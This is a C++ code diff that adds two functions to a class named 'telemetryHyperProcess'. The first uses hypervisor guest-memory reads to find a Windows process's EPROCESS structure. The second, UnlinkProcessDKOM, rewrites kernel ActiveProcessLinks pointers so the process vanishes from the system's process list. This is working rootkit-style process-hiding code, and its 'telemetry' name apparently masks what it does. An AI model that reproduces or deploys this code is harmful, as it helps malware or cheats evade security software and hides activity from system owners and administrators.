@@ -502,3 +502,70 @@ DWORD telemetryHyperProcess::FindProcessIdByName(const wchar_t* const process_na
 
     return 0;
 }
+std::uint64_t telemetryHyperProcess::GetEProcessAddress(std::uint32_t pid)
+{
+    if (pid == 0 || !ResolvePsInitialSystemProcess()) return 0;
+
+    std::uint64_t current_eprocess = 0;
+    std::uint64_t walk_cr3 = g_CurrentCr3;
+
+    if (telemetryHyperCall::ReadGuestVirtualMemory(&current_eprocess, g_PsInitialSystemProcess, walk_cr3, 8) != 8 || current_eprocess == 0)
+        return 0;
+
+    const auto start_eprocess = current_eprocess;
+    do {
+        std::uint64_t current_pid = 0;
+        telemetryHyperCall::ReadGuestVirtualMemory(&current_pid, current_eprocess + eprocess::UniqueProcessId, walk_cr3, 8);
+
+        if (current_pid == pid) {
+            return current_eprocess;
+        }
+
+        std::uint64_t next_link = 0;
+        if (telemetryHyperCall::ReadGuestVirtualMemory(&next_link, current_eprocess + eprocess::ActiveProcessLinks, walk_cr3, 8) != 8 || next_link == 0)
+            break;
+
+        current_eprocess = next_link - eprocess::ActiveProcessLinks;
+    } while (current_eprocess != 0 && current_eprocess != start_eprocess);
+
+    return 0;
+}
+
+bool telemetryHyperProcess::UnlinkProcessDKOM(std::uint64_t eprocess_address)
+{
+    if (eprocess_address == 0 || !ResolvePsInitialSystemProcess()) return false;
+
+    std::uint64_t walk_cr3 = g_CurrentCr3;
+
+    // ActiveProcessLinks is a LIST_ENTRY at offset 0x448
+    // LIST_ENTRY { Flink (8 bytes), Blink (8 bytes) }
+    std::uint64_t our_apl = eprocess_address + eprocess::ActiveProcessLinks;
+
+    // Read our Flink and Blink
+    std::uint64_t our_flink = 0, our_blink = 0;
+    if (telemetryHyperCall::ReadGuestVirtualMemory(&our_flink, our_apl, walk_cr3, 8) != 8)
+        return false;
+    if (telemetryHyperCall::ReadGuestVirtualMemory(&our_blink, our_apl + 8, walk_cr3, 8) != 8)
+        return false;
+
+    if (our_flink == 0 || our_blink == 0) return false;
+
+    // Flink points to NEXT->ActiveProcessLinks (which starts with Flink)
+    // Blink points to PREV->ActiveProcessLinks (which starts with Flink, then Blink at +8)
+
+    // Patch: PREV->Flink = our_flink (skip us)
+    if (telemetryHyperCall::WriteGuestVirtualMemory(&our_flink, our_blink, walk_cr3, 8) != 8)
+        return false;
+
+    // Patch: NEXT->Blink = our_blink (skip us)
+    if (telemetryHyperCall::WriteGuestVirtualMemory(&our_blink, our_flink + 8, walk_cr3, 8) != 8)
+        return false;
+
+    // Self-loop: point our own Flink/Blink to ourselves (safe for process exit)
+    if (telemetryHyperCall::WriteGuestVirtualMemory(&our_apl, our_apl, walk_cr3, 8) != 8)
+        return false;
+    if (telemetryHyperCall::WriteGuestVirtualMemory(&our_apl, our_apl + 8, walk_cr3, 8) != 8)
+        return false;
+
+    return true;
+}
